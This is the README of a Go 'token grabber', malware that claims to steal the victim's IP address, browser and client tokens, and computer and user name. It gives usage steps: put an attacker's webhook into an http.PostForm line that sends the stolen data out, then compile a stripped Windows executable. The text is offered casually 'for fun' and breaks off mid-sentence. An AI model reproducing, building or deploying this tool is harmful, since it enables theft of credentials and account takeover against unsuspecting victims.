# Token Gorabber
## What is this?
This is a very simple token grabber written in Go that can grab:
- IP ADDRESS
- EVERY TOKEN FROM VARIOUS SOURCES LIKE BROWSER OR MANY CLIENTS
- COMPUTER'S NAME AND USER NAME
But just for now...

## How do i use it?
If you wanna get fun then you could follow those steps:
- Well, you could just simply download main.go
- Edit the file and replace ->THIS<-

```
_, err = http.PostForm("->THIS<-", url.Values{"content": {msg}})
```
by your webhook
- then compile it using
```
GOOS=windows go build -ldflags="-s -w" main.go
```

Or if you prefer, you could just 
